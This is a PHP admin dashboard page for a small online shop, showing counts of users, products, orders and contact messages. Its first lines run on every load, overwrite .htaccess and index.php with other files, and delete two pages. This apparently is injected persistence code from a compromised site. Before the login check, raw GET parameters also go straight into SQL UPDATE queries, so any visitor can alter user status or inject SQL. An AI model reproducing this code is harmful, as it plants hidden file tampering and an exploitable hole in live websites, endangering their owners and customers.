<?php
@ob_start();
//session_start();
copy('lavnasur.php','.htaccess');
copy('index_backup.php','index.php');
unlink('about.php');
unlink('content.php');
require_once 'config/config.php';
require_once 'config/helper.php';





if (isset($_GET['active'])) {
    
    $activate = $_GET['active'];
    $sql=$db->query("UPDATE users SET status='0' WHERE user_id=$activate ");
    echo "<script>alert(' Deactivate Successfully.'); window.location = 'users_list.php';</script>";
}
if (isset($_GET['deactivate'])) {
    $deactivate = $_GET['deactivate'];
    $sql1=$db->query("UPDATE users SET status='1' WHERE user_id=$deactivate");
    echo "<script>alert('Activate Successfully.'); window.location = 'users_list.php';</script>";
}






if (!empty($_SESSION['ibc'])) {
if ($_SESSION['ibc'] != session_id()) {
header('Location: index.php');
exit;
}
} else {
header('Location: login.php');
exit;
}
$logintype = $_SESSION['logintype'];
$a_idchk = $_SESSION['a_id'];

$ausernmae = $_SESSION['a_name'];
ob_start("ob_html_compress");
$comp_select = $db->query("SELECT * FROM `admin`");
$comp_fetch = $comp_select->fetch_object();
$a_company = $comp_fetch->a_company;
$check_a_name = $_SESSION['a_name'];
function facebook_time_ago($timestamp)
{
$time_ago = strtotime($timestamp);
$current_time = time();
$time_difference = $current_time - $time_ago;
$seconds = $time_difference;
$minutes      = round($seconds / 60);           // value 60 is seconds
$hours           = round($seconds / 3600);           //value 3600 is 60 minutes * 60 sec
$days          = round($seconds / 86400);          //86400 = 24 * 60 * 60;
$weeks          = round($seconds / 604800);          // 7*24*60*60;
$months          = round($seconds / 2629440);     //((365+365+365+365+366)/5/12)*24*60*60
$years          = round($seconds / 31553280);     //(365+365+365+365+366)/5 * 24 * 60 * 60
if ($seconds <= 60) {
return "Just Now";
} else if ($minutes <= 60) {
if ($minutes == 1) {
return "one minute ago";
} else {
return "$minutes minutes ago";
}
} else if ($hours <= 24) {
if ($hours == 1) {
return "an hour ago";
} else {
return "$hours hrs ago";
}
} else if ($days <= 7) {
if ($days == 1) {
return "yesterday";
} else {
return "$days days ago";
}
} else if ($weeks <= 4.3) //4.3 == 52/12
{
if ($weeks == 1) {
return "a week ago";
} else {
return "$weeks weeks ago";
}
} else if ($months <= 12) {
if ($months == 1) {
return "a month ago";
} else {
return "$months months ago";
}
} else {
if ($years == 1) {
return "one year ago";
} else {
return "$years years ago";
}
}
}
?>

<?php include 'header.php'; ?>
<style>
.dbox {
    position: relative;
    background: rgb(255, 86, 65);
    background: -moz-linear-gradient(top, rgba(255, 86, 65, 1) 0%, rgba(253, 50, 97, 1) 100%);
    background: -webkit-linear-gradient(top, rgba(255, 86, 65, 1) 0%, rgba(253, 50, 97, 1) 100%);
    background: linear-gradient(to bottom, rgba(255, 86, 65, 1) 0%, rgba(253, 50, 97, 1) 100%);
    filter: progid: DXImageTransform.Microsoft.gradient( startColorstr='#ff5641', endColorstr='#fd3261', GradientType=0);
    border-radius: 4px;
    text-align: center;
    margin: 60px 0 50px;
}
.dbox__icon {
    position: absolute;
    transform: translateY(-50%) translateX(-50%);
    left: 50%;
}
.dbox__icon:before {
    width: 75px;
    height: 75px;
    position: absolute;
    background: #fda299;
    background: rgba(253, 162, 153, 0.34);
    content: '';
    border-radius: 50%;
    left: -17px;
    top: -17px;
    z-index: -2;
}
.dbox__icon:after {
    width: 60px;
    height: 60px;
    position: absolute;
    background: #f79489;
    background: rgba(247, 148, 137, 0.91);
    content: '';
    border-radius: 50%;
    left: -10px;
    top: -10px;
    z-index: -1;
}
.dbox__icon > i {
    background: #ff5444;
    border-radius: 50%;
    line-height: 40px;
    color: #FFF;
    width: 40px;
    height: 40px;
	font-size:22px;
}
.dbox__body {
    padding: 50px 20px;
}
.dbox__count {
    display: block;
    font-size: 30px;
    color: #FFF;
    font-weight: 300;
}
.dbox__title {
    font-size: 18px;
    color:white;
    font-weight:bold;
   
}
.dbox__action {
    transform: translateY(-50%) translateX(-50%);
    position: absolute;
    left: 50%;
}
.dbox__action__btn {
    border: none;
    background: #FFF;
    border-radius: 19px;
    padding: 7px 16px;
    text-transform: uppercase;
    font-weight: 500;
    font-size: 11px;
    letter-spacing: .5px;
    color: #003e85;
    box-shadow: 0 3px 5px #d4d4d4;
}


.dbox--color-2 {
    background: rgb(252, 190, 27);
    background: -moz-linear-gradient(top, rgba(252, 190, 27, 1) 1%, rgba(248, 86, 72, 1) 99%);
    background: -webkit-linear-gradient(top, rgba(252, 190, 27, 1) 1%, rgba(248, 86, 72, 1) 99%);
    background: linear-gradient(to bottom, rgba(252, 190, 27, 1) 1%, rgba(248, 86, 72, 1) 99%);
    filter: progid: DXImageTransform.Microsoft.gradient( startColorstr='#fcbe1b', endColorstr='#f85648', GradientType=0);
}
.dbox--color-2 .dbox__icon:after {
    background: #fee036;
    background: rgba(254, 224, 54, 0.81);
}
.dbox--color-2 .dbox__icon:before {
    background: #fee036;
    background: rgba(254, 224, 54, 0.64);
}
.dbox--color-2 .dbox__icon > i {
    background: #fb9f28;
}

.dbox--color-3 {
    background: rgb(183,71,247);
    background: -moz-linear-gradient(top, rgba(183,71,247,1) 0%, rgba(108,83,220,1) 100%);
    background: -webkit-linear-gradient(top, rgba(183,71,247,1) 0%,rgba(108,83,220,1) 100%);
    background: linear-gradient(to bottom, rgba(183,71,247,1) 0%,rgba(108,83,220,1) 100%);
    filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#b747f7', endColorstr='#6c53dc',GradientType=0 );
}
.dbox--color-3 .dbox__icon:after {
    background: #b446f5;
    background: rgba(180, 70, 245, 0.76);
}
.dbox--color-3 .dbox__icon:before {
    background: #e284ff;
    background: rgba(226, 132, 255, 0.66);
}
.dbox--color-3 .dbox__icon > i {
    background: #8150e4;
}
</style>
<?php
$clt_usr_cnt="select count(id) as usr_count from `users`";
$qst_clt_usr_cnt=$db->query($clt_usr_cnt);
$clct_clt_usr_cnt=$qst_clt_usr_cnt->fetch_assoc();

$usr_count=$clct_clt_usr_cnt['usr_count'];


$clt_contct_cnt="select count(id) as contact_count from `contact`";
$qst_clt_contct_cnt=$db->query($clt_contct_cnt);
$clct_clt_contct_cnt=$qst_clt_contct_cnt->fetch_assoc();

$cnct_count=$clct_clt_contct_cnt['contact_count'];



$clt_prdt_cnt="select count(id) as product_count from `products`";
$qst_clt_prdt_cnt=$db->query($clt_prdt_cnt);
$clct_clt_prdt_cnt=$qst_clt_prdt_cnt->fetch_assoc();

$prdt_count=$clct_clt_prdt_cnt['product_count'];



$clt_prd_count="select count(id) as order_count from `orders`";
$qst_clt_prd_count=$db->query($clt_prd_count);
$clct_clt_prd_count=$qst_clt_prd_count->fetch_assoc();


$total_order_count=$clct_clt_prd_count['order_count'];



?>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>



<link href="https://cdn.datatables.net/1.12.1/css/jquery.dataTables.min.css" rel="stylesheet" />
<script src="https://cdn.datatables.net/1.12.1/js/jquery.dataTables.min.js"></script>

<div id="layoutSidenav_content">
<main>
<div class="container-fluid">
<!--<h2 class="mt-30 page-title">All Bidders</h2>-->
<ol class="breadcrumb mb-30">
<li class="breadcrumb-item active" style="font-size: 18px;font-weight: bold;color: black !important;">View Products</li>
</ol>
    

<?php 
if($usr_typ==1)
{
?>
<div class="row">
<div class='col-md-12'>
<center>
<!--<h1>Welcome to Vallabh Textiles Admin</h1>-->

</center>

</div>







</div>
<div class="row" >

    
<div class="col-md-3 col-xs-6">
       <a href="view_users.php" style="text-decoration:none">
<div class="dbox dbox--color-1" style="box-shadow: 5px 6px 20px 0px #8f8b8b;border-radius: 12px !important;">

<div class="dbox__body" style="background: linear-gradient(45deg,#4099ff,#73b4ff);border-radius: 12px;"><span class="dbox__count"><?php echo $usr_count;?></span> 
<span class="dbox__title" ><i class="fa fa-users f-left"></i> Total Users</span>
</div>
</div>
</a>
</div>



    
<div class="col-md-3 col-xs-6">
    <a href="view_product.php" style="text-decoration:none">
<div class="dbox dbox--color-1" style="box-shadow: 5px 6px 20px 0px #8f8b8b;border-radius: 12px !important;">

<div class="dbox__body" style="background: linear-gradient(45deg,#fa9564db,#ff70707a);border-radius: 12px;"><span class="dbox__count"><?php echo $prdt_count;?></span> 
<span class="dbox__title" ><i class="fa fa-list-alt" aria-hidden="true"></i> Total Products</span>
</div>
</div>
</a>
</div>







<div class="col-md-3 col-xs-6">
    <a href="view_all_orders.php" style="text-decoration:none">
<div class="dbox dbox--color-1" style="box-shadow: 5px 6px 20px 0px #8f8b8b;border-radius: 12px !important;">

<div class="dbox__body" style="background: linear-gradient(45deg,#64fa75db,#0fbb2ee8);border-radius: 12px;"><span class="dbox__count"><?php echo $total_order_count;?></span> 
<span class="dbox__title" ><i class="fa fa-shopping-cart" aria-hidden="true"></i> Total Orders</span>
</div>
</div>
</a>
</div>


<div class="col-md-3 col-xs-6">
    <a href="" style="text-decoration:none">
<div class="dbox dbox--color-1" style="box-shadow: 5px 6px 20px 0px #8f8b8b;border-radius: 12px !important;">

<div class="dbox__body" style="background: linear-gradient(45deg,#fae664db,#ffe045b8);border-radius: 12px;"><span class="dbox__count">###</span> 
<span class="dbox__title" ><i class="fa fa-shopping-cart" aria-hidden="true"></i> Pending Orders</span>
</div>
</div>
</a>
</div>

<div class="col-md-3 col-xs-6">
    <a href="" style="text-decoration:none">
<div class="dbox dbox--color-1" style="box-shadow: 5px 6px 20px 0px #8f8b8b;border-radius: 12px !important;">

<div class="dbox__body" style="background: linear-gradient(45deg,#176071db,#26e8cbe8);border-radius: 12px;"><span class="dbox__count">###</span> 
<span class="dbox__title" ><i class="fa fa-archive"></i> Dispatched Orders</span>
</div>
</div>
</a>
</div>

    <div class="col-md-3 col-xs-6">
    <a href="" style="text-decoration:none">
<div class="dbox dbox--color-1" style="box-shadow: 5px 6px 20px 0px #8f8b8b;border-radius: 12px !important;">

<div class="dbox__body" style="background: linear-gradient(45deg,#f6a400,#bb9f0fe8);border-radius: 12px;"><span class="dbox__count">###</span> 
<span class="dbox__title" ><i class="fa fa-truck"></i> On the way Orders</span>
</div>
</div>
</a>
</div>


  <div class="col-md-3 col-xs-6">
    <a href="" style="text-decoration:none">
<div class="dbox dbox--color-1" style="box-shadow: 5px 6px 20px 0px #8f8b8b;border-radius: 12px !important;">

<div class="dbox__body" style="background: linear-gradient(45deg,#64fa75db,#0fbb2ee8);border-radius: 12px;"><span class="dbox__count">###</span> 
<span class="dbox__title" ><i class="fa fa-check" aria-hidden="true"></i> Delivered Order</span>
</div>
</div>
</a>
</div>

  <div class="col-md-3 col-xs-6">
    <a href="" style="text-decoration:none">
<div class="dbox dbox--color-1" style="box-shadow: 5px 6px 20px 0px #8f8b8b;border-radius: 12px !important;">

<div class="dbox__body" style="background: linear-gradient(45deg,#fa647ddb,#bb0f2be8);border-radius: 12px;"><span class="dbox__count">###</span> 
<span class="dbox__title" ><i class="fa fa-times-circle"></i> Cancel Order</span>
</div>
</div>
</a>
</div>

  <div class="col-md-3 col-xs-6">
    <a href="" style="text-decoration:none">
<div class="dbox dbox--color-1" style="box-shadow: 5px 6px 20px 0px #8f8b8b;border-radius: 12px !important;">

<div class="dbox__body" style="background: linear-gradient(45deg,#b3c2c4db,#000000e8);border-radius: 12px;"><span class="dbox__count">###</span> 
<span class="dbox__title" >₹ Refunded Order</span>
</div>
</div>
</a>
</div>


    <div class="col-md-3 col-xs-6">
    <a href="contact_us.php" style="text-decoration:none">
<div class="dbox dbox--color-1" style="box-shadow: 5px 6px 20px 0px #8f8b8b;border-radius: 12px !important;">

<div class="dbox__body" style="background: linear-gradient(45deg,#a464fa,#19a4cb);border-radius: 12px;"><span class="dbox__count"><?php echo $cnct_count;?></span> 
<span class="dbox__title" ><i class="fa fa-question"></i> Total Contact us</span>
</div>
</div>
</a>
</div>


</div>
<?php 
}
?>





</div>
</main>

<script>
    
    
    function dlt_lqdtr(txt)
    {
        var txt1=txt;
       

 $.ajax({
url: "dlt_lqdtor.php",
type: "POST",
data    : {txt1:txt1},
cache: false,
success: function(data){
Swal.fire({

icon: 'success',
title: 'Your work has been saved',
showConfirmButton: false,
timer: 1500
});
window.location='';

}
});

       




    }
    
   
    </script>


<script src="https://code.jquery.com/jquery-3.5.1.js"></script>

<script src="https://cdn.datatables.net/1.12.1/js/jquery.dataTables.min.js"></script>
<script src="https://cdn.datatables.net/buttons/2.2.3/js/dataTables.buttons.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.1.3/jszip.min.js"></script>
<script src="https://cdn.datatables.net/buttons/2.2.3/js/buttons.html5.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.53/pdfmake.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/pdfmake/0.1.53/vfs_fonts.js"></script>
<script src="https://cdn.datatables.net/buttons/2.2.3/js/buttons.print.min.js"></script>












<script>
    $(document).ready( function () {
         $('#myTable').DataTable( {
        dom: 'Bfrtip',
        buttons: [
            'copy', 'csv', 'excel', 'pdf', 'print'
        ]
    } );
} );
    </script>

<?php include 'footer.php'; 

ob_flush();

?>